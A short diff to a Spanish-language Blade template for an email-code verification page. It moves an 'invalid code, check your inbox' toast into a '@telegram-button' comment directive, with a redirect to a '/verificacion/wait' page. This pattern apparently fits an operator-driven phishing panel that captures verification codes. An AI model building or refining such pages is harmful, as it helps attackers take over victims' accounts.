@@ -1,4 +1,5 @@
 {{-- @telegram-button: Correo --}}
+{{-- @toast-message: El codigo de correo no es valido, revise su bandeja de entrada --}}
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -124,7 +125,6 @@
     <x-control
         :auto-completar="false"
         redirect-url="/verificacion/wait"
-        toast-message="El codigo de correo no es valido, revise su bandeja de entrada"
     />
 </body>
 </html>
